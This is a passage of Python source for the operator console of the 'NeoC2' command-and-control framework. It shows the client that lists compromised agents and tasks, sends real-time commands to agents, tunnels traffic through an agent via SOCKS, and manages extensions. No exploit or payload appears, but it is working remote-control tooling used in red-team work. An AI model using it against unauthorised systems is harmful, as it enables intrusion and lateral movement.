                    print(f"Chain Details:")
                    print("-" * 80)
                    print(f"Chain ID:   {chain_status.get('chain_id', '')}")
                    print(f"Name:       {chain_status.get('name', '')}")
                    print(f"Agent ID:   {chain_status.get('agent_id', '')}")
                    print(f"Status:     {chain_status.get('status', '')}")
                    print(f"Created:    {chain_status.get('created_at', '')}")
                    print(f"Started:    {chain_status.get('started_at', 'N/A')}")
                    print(f"Completed:  {chain_status.get('completed_at', 'N/A')}")
                    print("-" * 80)
                    print("Tasks:")
                    print("-" * 80)

                    for task in chain_status.get('tasks', []):
                        print(f"  [{task.get('sequence_order', '')}] {task.get('module_name', '')} - {task.get('status', '')}")
                        if task.get('error'):
                            print(f"      Error: {task.get('error')}")
                        if task.get('result_output'):
                            print(f"      Result: {task.get('result_output')}")
                        print("-" * 80)
                elif 'task_details' in message:
                    # Format task details as before
                    task_details = message.get('task_details', {})
                    print(f"Task Details:")
                    print("-" * 80)
                    print(f"Task ID:      {task_details.get('id', '')}")
                    print(f"Agent ID:     {task_details.get('agent_id', '')}")
                    print(f"Hostname:     {task_details.get('hostname', 'N/A')} ({task_details.get('user', 'N/A')})")
                    print(f"IP Address:   {task_details.get('ip_address', 'N/A')}")
                    print(f"Command:      {task_details.get('command', '')[:20]}{'...' if len(task_details.get('command', '')) > 20 else ''}")
                    print(f"Status:       {task_details.get('status', '')}")
                    print(f"Task Type:    {task_details.get('task_type', 'queued')}")
                    print(f"Created:      {task_details.get('created_at', '')}")
                    print(f"Completed:    {task_details.get('completed_at', 'N/A')}")
                    print("-" * 80)
                    print(f"Complete Result:")
                    print(f"{task_details.get('result', 'No result available')}")
                    print("-" * 80)
                elif 'tasks' in message:
                    # Format tasks as before
                    tasks = message.get('tasks', [])
                    agent_id = message.get('agent_id', '')
                    limit = message.get('limit', 50)

                    if not tasks:
                        if agent_id:
                            print(f"No pending tasks for agent {agent_id}")
                        else:
                            print(f"No results found")
                    else:
                        if agent_id:
                            print(f"Pending Tasks for Agent {agent_id}:")
                        else:
                            print(f"Recent Task Results (Last {limit}):")

                        print("-" * 80)
                        for task in tasks:
                            if agent_id:  # Pending tasks
                                print(f"Task ID: {task.get('id', '')}")
                                print(f"Command: {task.get('command', '')[:20]}{'...' if len(task.get('command', '')) > 20 else ''}")
                                print(f"Status: {task.get('status', '')} ({task.get('task_type', '')})")
                                print(f"Created: {task.get('created_at', '')}")
                            else:  # Recent results
                                print(f"Task ID:      {task.get('task_id', '')}")
                                print(f"Agent:        {task.get('agent_id', '')} ({task.get('hostname', 'N/A')}@{task.get('user', 'N/A')})")
                                print(f"Command:      {task.get('command', '')[:20]}{'...' if len(task.get('command', '')) > 20 else ''}")
                                print(f"Type:         {task.get('task_type', '')}")
                                print(f"Completed:    {task.get('completed_at', '')}")
                                print(f"Result:       {task.get('result', '')[:100]}{'...' if len(task.get('result', '')) > 100 else ''}")
                            print("-" * 80)
                elif 'results' in message:
                    # Format results as before
                    results = message.get('results', [])
                    agent_id = message.get('agent_id', '')

                    if not results:
                        if agent_id:
                            print(f"No results found for agent {agent_id}")
                        else:
                            print(f"No results found")
                    else:
                        if agent_id:
                            print(f"Results for Agent {agent_id}:")
                        else:
                            limit = message.get('limit', 50)
                            print(f"Recent Task Results (Last {limit}):")

                        print("-" * 80)
                        for res in results:
                            if agent_id:  # Results for specific agent
                                print(f"Task ID:      {res.get('task_id', '')}")
                                print(f"Command:      {res.get('command', '')}")
                                print(f"Created:      {res.get('created_at', '')}")
                                print(f"Completed:    {res.get('completed_at', '')}")
                                print(f"Result:       {res.get('result', '')[:100]}{'...' if len(res.get('result', '')) > 100 else ''}")
                            else:  # Recent results
                                print(f"Task ID:      {res.get('task_id', '')}")
                                print(f"Agent:        {res.get('agent_id', '')} ({res.get('hostname', 'N/A')}@{res.get('user', 'N/A')})")
                                print(f"Command:      {res.get('command', '')[:20]}{'...' if len(res.get('command', '')) > 20 else ''}")
                                print(f"Type:         {res.get('task_type', '')}")
                                print(f"Completed:    {res.get('completed_at', '')}")
                                print(f"Result:       {res.get('result', '')[:100]}{'...' if len(res.get('result', '')) > 100 else ''}")
                            print("-" * 80)
                elif 'chain_data' in message:
                    # Format chain data as before
                    chain_data = message.get('chain_data', {})
                    chain_name = chain_data.get('chain_name', '')
                    chain_id = chain_data.get('chain_id', '')
                    modules = chain_data.get('modules', [])
                    execution_status = chain_data.get('execution_status', '')

                    print(f"Task chain '{chain_name}' created successfully")
                    print(f"Chain ID: {chain_id}")
                    print(f"Modules: {', '.join(modules)}")
                    if execution_status:
                        print(execution_status)
                elif 'status' in message:
                    # Format status as before
                    stats = message.get('status', {})
                    print(f"""
Framework Status:
Total Agents:      {stats.get('total_agents', 0)}
Active Agents:     {stats.get('active_agents', 0)}
Total Tasks:       {stats.get('total_tasks', 0)}
Pending Tasks:     {stats.get('pending_tasks', 0)}
DB Total Agents:   {stats.get('db_total_agents', 0)}
DB Active Agents:  {stats.get('db_active_agents', 0)}
DB Inactive:       {stats.get('db_inactive_agents', 0)}
                    """.strip())
                elif 'reports' in message:
                    # Format reports list as a table
                    reports = message.get('reports', [])
                    if not reports:
                        print(f"{blue('[*]')} No reports available")
                    else:
                        print("Available Reports:")
                        print("-" * 80)
                        print(f"{'ID':<20} {'Title':<30} {'Description'}")
                        print("-" * 80)
                        for report in reports:
                            print(f"{report.get('id', ''):<20} {report.get('title', ''):<30} {report.get('description', '')}")
                elif 'events' in message:
                    # Format events list as a table
                    events = message.get('events', [])
                    limit = message.get('limit', 50)
                    if not events:
                        print(f"{blue('[*]')} No audit events found")
                    else:
                        print(f"Audit Events (limit: {limit}):")
                        print("-" * 150)
                        print(f"{'Timestamp':<25} {'Username':<20} {'Action':<20} {'Resource':<30} {'Details':<40}")
                        print("-" * 150)
                        for event in events:
                            print(f"{event.get('timestamp', ''):<25} {event.get('username', ''):<20} {event.get('action', ''):<20} {event.get('resource', ''):<30} {event.get('details', ''):<40}")
                elif 'search_results' in message:
                    # Format search results as a table
                    search_results = message.get('search_results', [])
                    query = message.get('query', '')
                    limit = message.get('limit', 50)
                    if not search_results:
                        print(f"{blue('[*]')} No events found for search query: {query}")
                    else:
                        print(f"Search Results for '{query}' (limit: {limit}):")
                        print("-" * 100)
                        for result in search_results:
                            print(f"[{result.get('timestamp', '')}] {result.get('username', '')} | {result.get('action', '')} | {result.get('resource_type', '')}/{result.get('resource_id', '')}")
                            print(f"  Details: {result.get('details', '')}")
                            print("-" * 100)
                elif 'stats' in message:
                    # Format stats as output
                    stats = message.get('stats', {})
                    print("Audit Log Statistics:")
                    print("-" * 50)
                    print(f"Total Logs: {stats.get('total_logs', 0)}")
                    print(f"Recent (24h): {stats.get('recent_24h', 0)}")
                    print("Actions:")
                    for action_name, count in stats.get('by_action', {}).items():
                        print(f"  {action_name}: {count}")
                elif 'result' in message:
                    # Handle interactive command results
                    result_text = message.get('result', '')
                    print(f"{green('[+]')} {result_text}")
                elif 'interactive' in message and message.get('interactive'):
                    # Handle interactive mode activation
                    agent_id = message.get('agent_id', '')
                    hostname = message.get('hostname', '')
                    user = message.get('user', '')
                    os_info = message.get('os_info', '')
                    msg = message.get('message', '')

                    print(f"\n{'=' * 80}")
                    print(f"{msg}")
                    print(f"Agent: {yellow(agent_id)}")
                    print(f"Hostname: {yellow(hostname)} | User: {yellow(user)} | OS: {yellow(os_info)}")
                    print(f"{'=' * 80}")
                    print("Commands are executed in REAL-TIME via interactive API")
                    print("Type 'back' to leave interactive mode")
                    print("Commands bypass task queue")
                    print("Exclusive access - other operators locked out")
                    print(f"{'=' * 80}")
                elif 'agent_info' in message:
                    # Format agent info as a table
                    agent_info = message.get('agent_info', {})
                    print("\nAgent Information:")
                    print("-" * 188)
                    print(f"{'ID':<38} {'IP Address':<15} {'Hostname':<20} {'OS':<15} {'User':<15} {'Listener ID':<38} {'Status':<12} {'Last Seen':<19}")
                    print("-" * 188)

                    agent_id = agent_info.get('id', '')
                    ip_address = agent_info.get('ip_address', '')
                    hostname = agent_info.get('hostname', '')
                    os_info = agent_info.get('os_info', '')
                    user = agent_info.get('user', '')
                    listener_id = agent_info.get('listener_id', '')
                    status = agent_info.get('status', '')
                    last_seen = agent_info.get('last_seen', '')

                    print(f"{agent_id:<38} {ip_address:<15} {hostname:<20} {os_info:<15} {user:<15} {listener_id:<38} {status:<12} {last_seen:<19}")

                    # Print additional information in a separate section
                    print("\nAdditional Information:")
                    print("-" * 80)
                    print(f"First Seen:      {agent_info.get('first_seen', '')}")
                    print(f"Pending Tasks:   {agent_info.get('pending_tasks', '')}")
                    print(f"Interactive Mode: {agent_info.get('interactive_mode', '')}")
                    print(f"Interactive Lock: {agent_info.get('interactive_lock', '')}")
                    print("-" * 80)
                else:
                    # For other JSON responses, print the message part if available
                    if 'message' in message:
                        print(f"{green('[+]')} {message['message']}")
                    elif 'error' in message:
                        print(f"{red('[-]')} {message['error']}")
                    else:
                        print(f"{green('[+]')} {str(message)}")
            else:
                print(f"{green('[+]')} {message}" if isinstance(message, str) and message.startswith('[+]') else f"{message}")
        elif status == 'error':
            # Handle JSON error responses
            if isinstance(message, dict) and 'error' in message:
                print(f"{red('[-]')} {message['error']}")
            else:
                print(f"{red('[-]')} {message}" if isinstance(message, str) and message.startswith('[-]') else f"{message}")
        elif status == 'info':
            # Handle JSON info responses
            if isinstance(message, dict) and 'message' in message:
                print(f"{blue('[*]')} {message['message']}")
            else:
                print(f"{blue('[*]')} {message}" if isinstance(message, str) and message.startswith('[*]') else f"{message}")
        elif status == 'warning':
            # Handle JSON warning responses
            if isinstance(message, dict) and 'message' in message:
                print(f"{yellow('[!]')} {message['message']}")
            else:
                print(f"{yellow('[!]')} {message}" if isinstance(message, str) and message.startswith('[!]') else f"{message}")
        elif status == 'interactive':
            # Handle interactive status
            if isinstance(message, dict):
                agent_id = message.get('agent_id', '')
                hostname = message.get('hostname', '')
                user = message.get('user', '')
                os_info = message.get('os_info', '')
                msg = message.get('message', '')

                print(f"\n{'=' * 80}")
                print(f"{msg}")
                print(f"Agent: {yellow(agent_id)}")
                print(f"Hostname: {yellow(hostname)} | User: {yellow(user)} | OS: {yellow(os_info)}")
                print(f"{'=' * 80}")
                print("Commands are executed in REAL-TIME via interactive API")
                print("Type 'back' to leave interactive mode")
                print("Commands bypass task queue")
                print("Exclusive access - other operators locked out")
                print(f"{'=' * 80}")
            else:
                print(f"{message}")
        else:
            print(str(message))

    def interactive_mode(self):
        if RICH_AVAILABLE:
            # Keeping ASCII art colored but removed colors from other text
            console.print(f"\n{'=' * 80}")
            console.print(Text(f"""███╗   ██╗███████╗ ██████╗  ██████╗██████╗
████╗  ██║██╔════╝██╔═══██╗██╔════╝╚════██╗
██╔██╗ ██║█████╗  ██║   ██║██║      █████╔╝
██║╚██╗██║██╔══╝  ██║   ██║██║     ██╔═══╝
██║ ╚████║███████╗╚██████╔╝╚██████╗███████╗
╚═╝  ╚═══╝╚══════╝ ╚═════╝  ╚═════╝╚══════╝
                                            """, style="bold green"))
            console.print(f"Neo Remote Command & Control Framework by @stillbigjosh")
            console.print(f"Connected to: {self.server_host}:{self.server_port}")
            console.print(f"User: {self.username}")
            console.print(f"Type 'help' for available commands")
            console.print(f"{'=' * 80}\n")
        else:
            print(f"\n{'=' * 80}")
            print(f"""███╗   ██╗███████╗ ██████╗  ██████╗██████╗
████╗  ██║██╔════╝██╔═══██╗██╔════╝╚════██╗
██╔██╗ ██║█████╗  ██║   ██║██║      █████╔╝
██║╚██╗██║██╔══╝  ██║   ██║██║     ██╔═══╝
██║ ╚████║███████╗╚██████╔╝╚██████╗███████╗
╚═╝  ╚═══╝╚══════╝ ╚═════╝  ╚═════╝╚══════╝
                                            """)
            print(f"Neo Remote Command & Control Framework by @stillbigjosh")
            print(f"Connected to: {self.server_host}:{self.server_port}")
            print(f"User: {self.username}")
            print(f"Type 'help' for available commands")
            print(f"{'=' * 80}\n")

        self._start_agent_refresh_thread()

        self._start_receive_thread()

        try:
            response = self.send_command("agent list")
            if response and response.get('success'):
                result = response.get('result', '')
                if 'No active agents' in result or 'No agents found' in result:
                    pass  # No active agents is fine
                else:
                    pass  # Agents data will be handled by agent update handler
        except:
            pass  # It's ok if this fails

        while self.connected:
            try:
                if self.is_interactive_mode:
                    interactive_result = self._try_receive_interactive_result()
                    while interactive_result:
                        # Handle JSON response from server
                        if isinstance(interactive_result, dict):
                            result_data = interactive_result.get('result', '')
                            if isinstance(result_data, dict):
                                # If the result is itself a JSON object, format it appropriately
                                if 'result' in result_data:
                                    result_text = result_data.get('result', '')
                                else:
                                    result_text = str(result_data)
                            else:
                                result_text = result_data
                        else:
                            result_text = interactive_result.get('result', '')

                        # Colorize result text based on content patterns
                        if isinstance(result_text, str) and result_text.startswith('[+]'):
                            colored_result = green(result_text)
                        elif isinstance(result_text, str) and result_text.startswith('[-]'):
                            colored_result = red(result_text)
                        elif isinstance(result_text, str) and result_text.startswith('[*]'):
                            colored_result = blue(result_text)
                        elif isinstance(result_text, str) and result_text.startswith('[!]'):
                            colored_result = yellow(result_text)
                        else:
                            colored_result = str(result_text)
                        print(colored_result)

                        self.interactive_command_sent = False
                        self.interactive_command_start_time = None

                        interactive_result = self._try_receive_interactive_result()


                self._process_agent_update_queue()

                if self.is_interactive_mode and self.current_agent:
                    prompt = f"\001{Fore.CYAN}\002NeoC2 [INTERACTIVE:{self.current_agent[:8]}] > \001{Style.RESET_ALL}\002"
                else:
                    prompt = f"\001{Fore.CYAN}\002NeoC2 ({self.username}@remote) > \001{Style.RESET_ALL}\002"

                # Show the prompt and get input
                command = input(prompt)
                command = command.strip()

                if not command:
                    continue

                readline.add_history(command)

                if command.lower() in ['exit', 'quit', 'q']:
                    break
                elif command.lower() == 'clear':
                    os.system('clear' if os.name == 'posix' else 'cls')
                    continue
                elif command.lower() == 'help':
                    self._show_help()
                    continue
                elif command.lower() == 'info':
                    # Handle 'info' command in interactive mode - show info for current agent
                    if self.is_interactive_mode and self.current_agent:
                        info_command = f"agent info {self.current_agent}"
                        response = self.send_command(info_command)

                        if response:
                            if response.get('success') is False:
                                self.print_result(f"Error: {response.get('error', 'Unknown error')}", 'error')
                            else:
                                result = response.get('result', 'No result')
                                status = response.get('status', 'info')
                                self.print_result(result, status)
                        else:
                            self.print_result("No response from server", 'error')
                    else:
                        # If not in interactive mode, show usage
                        print(f"{yellow('[*]')} Usage: 'info' can only be used in interactive mode. Use 'agent info <agent_id>' to get info for a specific agent.")
                    continue
                elif command.lower().startswith('info '):
                    # Handle 'info <agent_id>' command
                    parts = command.split(' ', 1)
                    if len(parts) == 2:
                        agent_id = parts[1]
                        info_command = f"agent info {agent_id}"
                        response = self.send_command(info_command)

                        if response:
                            if response.get('success') is False:
                                self.print_result(f"Error: {response.get('error', 'Unknown error')}", 'error')
                            else:
                                result = response.get('result', 'No result')
                                status = response.get('status', 'info')
                                self.print_result(result, status)
                        else:
                            self.print_result("No response from server", 'error')
                    else:
                        print(f"{yellow('[*]')} Usage: info <agent_id>")
                    continue
                elif command.lower().startswith('agent monitor'):
                    self._handle_agent_monitor(command)
                    continue
                elif command.lower().startswith('agent unmonitor'):
                    self._handle_agent_unmonitor(command)
                    continue
                elif command.lower().startswith('socks'):
                    # Parse the command - format: socks [agent_id] [port] or socks [port] when in interactive mode
                    parts = command.strip().split()

                    if len(parts) < 2:
                        print(f"{red('[-]')} Usage: socks <agent_id> [port] or socks [port] (in interactive mode)")
                        continue

                    agent_id = None
                    local_socks_port = 1080  # Default local port

                    # If in interactive mode and only one argument is provided, treat it as port
                    if self.is_interactive_mode and self.current_agent and len(parts) == 2:
                        try:
                            # Try to parse the argument as a port number
                            port_arg = int(parts[1])
                            if 1 <= port_arg <= 65535:
                                local_socks_port = port_arg
                                agent_id = self.current_agent  # Use current agent
                            else:
                                print(f"{red('[-]')} Port must be between 1 and 65535")
                                continue
                        except ValueError:
                            # Not a valid port, treat as agent ID
                            agent_id = parts[1]
                    else:
                        # Parse as: socks <agent_id> [port]
                        agent_id = parts[1]

                        # Check if there's a second arg for port
                        if len(parts) > 2:
                            try:
                                port_arg = int(parts[2])
                                if 1 <= port_arg <= 65535:
                                    local_socks_port = port_arg
                                else:
                                    print(f"{red('[-]')} Port must be between 1 and 65535")
                                    continue
                            except ValueError:
                                print(f"{red('[-]')} Invalid port number: {parts[2]}")
                                continue

                    if not agent_id:
                        print(f"{red('[-]')} No agent specified. Use 'agent interact <agent_id>' first or specify agent ID explicitly.")
                        continue

                    # Send command to start CLI SOCKS proxy on server
                    cli_socks_cmd = f"cli_socks_proxy start {agent_id} 1080"
                    socks_start_response = self.send_command(cli_socks_cmd)
                    if socks_start_response and socks_start_response.get('status') == 'success':
                        print(f"{green('[+]')} Server CLI SOCKS proxy started for agent {agent_id} on port 1080")
                    else:
                        error_msg = socks_start_response.get('result', 'Unknown error') if socks_start_response else 'Failed to start server CLI SOCKS proxy'
                        print(f"{red('[-]')} Failed to start server CLI SOCKS proxy: {error_msg}")
                        continue

                    # Store the server port to use in _relay_data_through_c2
                    self.server_socks_proxy_port = 1080
                    self.current_agent_for_socks = agent_id  # Store for potential use

                    print(f"{green('[*]')} Starting local SOCKS5 proxy on port {local_socks_port}...")
                    print(f"{green('[*]')} Use Ctrl+C to stop the proxy")
                    self.start_socks_proxy(local_socks_port)
                    continue
                elif command.lower() == 'socks stop':
                    # Stop the server's CLI SOCKS proxy
                    agent_id = getattr(self, 'current_agent_for_socks', None)

                    # If no agent was used for socks, try current agent if in interactive mode
                    if not agent_id and self.is_interactive_mode and self.current_agent:
                        agent_id = self.current_agent
                    elif not agent_id:
                        print(f"{red('[-]')} No SOCKS proxy was started. Usage: socks <agent_id> [port]")
                        continue

                    # Send command to stop CLI SOCKS proxy on server
                    cli_socks_cmd = f"cli_socks_proxy stop {agent_id}"
                    socks_stop_response = self.send_command(cli_socks_cmd)
                    if socks_stop_response and socks_stop_response.get('status') == 'success':
                        print(f"{green('[+]')} Server CLI SOCKS proxy stopped for agent {agent_id}")
                        # Clear the stored port and agent
                        if hasattr(self, 'server_socks_proxy_port'):
                            delattr(self, 'server_socks_proxy_port')
                        if hasattr(self, 'current_agent_for_socks'):
                            delattr(self, 'current_agent_for_socks')
                    else:
                        error_msg = socks_stop_response.get('result', 'Unknown error') if socks_stop_response else 'Failed to stop server CLI SOCKS proxy'
                        print(f"{red('[-]')} Failed to stop server CLI SOCKS proxy: {error_msg}")
                    continue
                elif command.lower().startswith('extender') or command.lower().startswith('extensions'):
                    # Handle extender commands: extender, extender list, extender info <name>, etc.
                    command_parts = command.strip().split()

                    if len(command_parts) == 1:
                        # Just 'extender' command - show usage help
                        print("Extension Commands Help:")
                        print("  extender install <name>    - Install an extension from the repository")
                        print("  extender list              - Show all installed extensions")
                        print("  extender list available    - Show all available extensions")
                        print("  extender search <term>     - Search for extensions in the repository")
                        print("  extender uninstall <name>  - Uninstall an extension")
                        print("  extender update <name>     - Update an extension")
                        print("  extender add-repo <name> <url> <key>    - Add a repository")
                        print("  extender remove-repo <name>             - Remove a repository")
                        print("  extender info <name>       - Show detailed information about a specific extension")
                        print("  extensions                 - Alternative command for 'extender'")
                        continue
                    elif len(command_parts) >= 2:
                        subcommand = command_parts[1].lower()

                        # Use the extender manager for complex commands
                        if self.extender and hasattr(self.extender, 'handle_extender_command'):
                            # Let the extender manager handle the command
                            self.extender.handle_extender_command(command)
                            continue
                        else:
                            # Fallback to basic commands if extender manager is not available
                            if subcommand == 'list' or command.lower() == 'extensions':
                                # Show available extension commands
                                if self.extender:
                                    if len(command_parts) > 2 and command_parts[2] == 'available':
                                        # If 'extender list available' is called, try to use package manager
                                        if hasattr(self.extender, 'package_manager') and self.extender.package_manager:
                                            self.extender.package_manager.list_available_packages()
                                        else:
                                            print(f"{red('[-]')} Extension package manager not available")
                                    else:
                                        self.extender.print_extension_list()
                                else:
                                    print(f"{red('[-]')} CLI extender is not available or failed to initialize")
                            elif subcommand == 'info' and len(command_parts) >= 3:
                                # Show info for specific extension
                                if self.extender:
                                    extension_name = command_parts[2]
                                    self.extender.print_extension_info(extension_name)
                                else:
                                    print(f"{red('[-]')} CLI extender is not available or failed to initialize")
                            else:
                                print(f"{red('[-]')} Unknown extender subcommand: {subcommand}")
                                print("Available extender commands:")
                                print("  extender install <name>    - Install an extension from the repository")
                                print("  extender list              - Show all installed extensions")
                                print("  extender list available    - Show all available extensions")
                                print("  extender search <term>     - Search for extensions in the repository")
                                print("  extender uninstall <name>  - Uninstall an extension")
                                print("  extender update <name>     - Update an extension")
                                print("  extender add-repo <name> <url> <key>    - Add a repository")
                                print("  extender remove-repo <name>             - Remove a repository")
                                print("  extender info <name>       - Show detailed information about a specific extension")
                    continue

                response = self.send_command(command)

                if response:
                    if response.get('success') is False:
                        self.print_result(f"Error: {response.get('error', 'Unknown error')}", 'error')
                    else:
                        result = response.get('result', 'No result')
                        status = response.get('status', 'info')

                        if status == 'interactive':
                            self.is_interactive_mode = True
                            # Handle JSON interactive response
                            if isinstance(result, dict) and 'agent_id' in result:
                                self.current_agent = result.get('agent_id', 'unknown')
                            elif isinstance(result, str) and 'Agent:' in result:
                                try:
                                    agent_line = [line for line in result.split('\n') if 'Agent:' in line][0]
                                    agent_id = agent_line.split('Agent:')[1].strip()
                                    self.current_agent = agent_id
                                except:
                                    self.current_agent = 'unknown'

                            self.print_result(result, status)
                        elif status == 'file_download':
                            self.print_result(result, status)
                        elif isinstance(result, str) and ('Exited interactive mode' in result or 'exited interactive mode' in result.lower()):
                            self.is_interactive_mode = False
                            self.current_agent = None

                            self.print_result(result, status)
                        else:
                            self.print_result(result, status)
                else:
                    self.print_result("No response from server", 'error')
                    if not self.connected:
                        print(f"{red('[-]')} Connection to server lost")
                        break

            except KeyboardInterrupt:
                print(f"\n{yellow('[!]')} Use 'exit' to quit")
            except EOFError:
                break
            except Exception as e:
                print(f"{red('[-]')} Error: {str(e)}")
                break



    def _show_help(self):
        response = self.send_command("help")

        if response:
            if response.get('success') is False:
                self.print_result(f"Error: {response.get('error', 'Failed to retrieve help from server')}", 'error')
            else:
                result = response.get('result', 'No help available from server')
                status = response.get('status', 'info')

                # If the response is a string and contains general help, append extension info
                if isinstance(result, str) and "available commands" in result.lower():
                    # Append extension commands info
                    if self.extender:
                        result += f"\n\nExtension Commands:"
                        result += f"\n  extender list          - Show all available extension commands"
                        result += f"\n  extender info <name>   - Show detailed information about a specific extension"
                        result += f"\n  extensions             - Alternative command for 'extender list'"
                        result += f"\n  Extension commands like 'whoami' will automatically be converted to 'execute-bof whoami.x64.o'"
                    else:
                        result += f"\n\nExtension Commands:"
                        result += f"\n  extender list          - Show all available extension commands"
                        result += f"\n  extender info <name>   - Show detailed information about a specific extension"
                        result += f"\n  extensions             - Alternative command for 'extender list'"
                        result += f"\n  (Extension system not available)"

                self.print_result(result, status)
        else:
            self.print_result("No response from server while retrieving help", 'error')

    def _handle_agent_monitor(self, command):
        response = self.send_command(command)

        if response:
            if response.get('success') is False:
                self.print_result(f"Error: {response.get('error', 'Unknown error')}", 'error')
            else:
                result = response.get('result', 'No result')
                status = response.get('status', 'info')
                self.print_result(result, status)
        else:
            self.print_result("No response from server", 'error')

    def _handle_agent_unmonitor(self, command):
        response = self.send_command(command)
        if response:
            if response.get('success') is False:
                self.print_result(f"Error: {response.get('error', 'Unknown error')}", 'error')
            else:
                result = response.get('result', 'No result')
                status = response.get('status', 'info')
                self.print_result(result, status)
        else:
            self.print_result("No response from server", 'error')

    def _show_loading_animation(self, stop_event, delay=0.1):
        chars = "/-\\|"
        idx = 0
        while not stop_event.is_set():
            if RICH_AVAILABLE:
                from rich.text import Text
                text = Text()
                text.append(green("[+]"))
                text.append(" Sending command... ")
                text.append(f"{chars[idx % len(chars)]}")

                with console.capture() as capture:
                    console.print(text, end='')
                output = capture.get()

                sys.stdout.write(f"\r{output}")
                sys.stdout.flush()
            else:
                sys.stdout.write(f"\r{green('[+]')} Sending command... {chars[idx % len(chars)]}")
                sys.stdout.flush()
            idx += 1
            time.sleep(delay)
        sys.stdout.write("\r                    \r")
        sys.stdout.flush()

    def _start_interactive_result_listener(self):
        pass

    def _start_agent_refresh_thread(self):
        self.agent_refresh_stop_event.clear()
        self.agent_refresh_thread = threading.Thread(target=self._agent_refresh_worker)
        self.agent_refresh_thread.daemon = True
        self.agent_refresh_thread.start()

    def _stop_agent_refresh_thread(self):
        if self.agent_refresh_stop_event:
            self.agent_refresh_stop_event.set()
        if self.agent_refresh_thread and self.agent_refresh_thread.is_alive():
            self.agent_refresh_thread.join(timeout=1)

    def _process_agent_update_queue(self):
        with self.agent_queue_lock:
            if not self.agent_update_queue:
                return

            queue_copy = self.agent_update_queue[:]
            self.agent_update_queue.clear()

        for message in queue_copy:
            self._handle_agent_update(message)

    def _agent_refresh_worker(self):
        while not self.agent_refresh_stop_event.is_set():
            try:
                self._process_agent_update_queue()

                # Wait for 0.5 seconds before next check (more responsive than 2 seconds)
                if self.agent_refresh_stop_event.wait(timeout=0.5):
                    break  # Stop event was set, exit the loop
            except Exception as e:
                continue  # Continue the loop even if there's an error

    def _stop_interactive_result_listener(self):
        pass

    def _handle_agent_update(self, message):
        agents_data = message.get('agents', [])

        if not agents_data:
            return

        with self.agent_update_lock:
            previous_agent_ids = set(self.active_agents.keys())

            for agent in agents_data:
                agent_id = agent.get('id')
                if agent_id:
                    if agent_id not in self.active_agents:
                        self.display_agent_alert(agent)

                    self.active_agents[agent_id] = agent


    def display_agent_alert(self, agent):
        try:
            alert_msg = f"\n{green('[+]')} NEW AGENT: ID={agent.get('id', 'N/A')} HOST={agent.get('hostname', 'N/A')} USER={agent.get('user', 'N/A')} IP={agent.get('ip_address', 'N/A')} OS={agent.get('os_info', 'N/A')} TIME={datetime.now().strftime('%H:%M:%S')}\n"

            sys.stdout.write(alert_msg)
            sys.stdout.flush()

            sys.stdout.write("\a")  # Terminal bell
            sys.stdout.flush()

        except Exception as e:
            sys.stdout.write(f"{red('[-]')} Error displaying agent alert: {str(e)}\n")
            sys.stdout.flush()

    def _try_receive_interactive_result(self):
        import errno
        try:
            ready, _, _ = select.select([self.sock], [], [], 0)
            if ready:
                response = self._receive_data()
                if response and response.get('type') == 'interactive_result':
                    self.interactive_command_sent = False
                    self.interactive_command_start_time = None
                    return response
        except OSError as e:
            if e.errno == errno.EBADF:
                return None
        except Exception:
            return None
        return None



    def disconnect(self):
        try:
            if self.connected:
                # Try to stop the server's CLI SOCKS proxy if it was started
                agent_id = getattr(self, 'current_agent_for_socks', None)
                if not agent_id and hasattr(self, 'current_agent') and self.current_agent:
                    agent_id = self.current_agent

                if agent_id:
                    try:
                        cli_socks_cmd = f"cli_socks_proxy stop {agent_id}"
                        # Send this command but don't wait for response since we're disconnecting
                        cmd_data = {
                            'type': 'command',
                            'command': cli_socks_cmd,
                            'token': self.auth_token,
                            'session_id': self.session_id
                        }
                        self._send_data(cmd_data)
                    except:
                        pass  # Ignore errors when disconnecting

                disconnect_data = {
                    'type': 'disconnect',
                    'token': self.auth_token,
                    'session_id': self.session_id
                }
                self._send_data(disconnect_data)

                self.connected = False

                try:
                    readline.write_history_file(self.history_file)
                except:
                    pass

        except:
            pass
        finally:
            # Stop the agent refresh thread
            self._stop_agent_refresh_thread()
            # Stop the receive thread
            self._stop_receive_thread()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--server", required=True, help="Server IP:PORT (e.g., 192.168.1.100:443)")
    parser.add_argument("--username", required=True, help="Username")
    parser.add_argument("--password", help="Password (will prompt if not provided)")
    parser.add_argument("--no-ssl", action="store_true", help="Disable SSL/TLS encryption")

    args = parser.parse_args()

    server_parts = args.server.split(':')
    if len(server_parts) != 2:
        print("Error: Server must be in format IP:PORT")
        sys.exit(1)

    server_host = server_parts[0]
    try:
        server_port = int(server_parts[1])
    except ValueError:
        print("Error: Port must be a number")
        sys.exit(1)

    if not args.password:
        args.password = getpass.getpass("Password: ")

    cli = NeoC2RemoteCLI(
        server_host=server_host,
        server_port=server_port,
        username=args.username,
        password=args.password,
        use_ssl=not args.no_ssl
    )

    if cli.connect():
        try:
            cli.interactive_mode()
        finally:
            cli.disconnect()
            print(f"\n{blue('[*]')} Disconnected from NeoC2 server")
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()
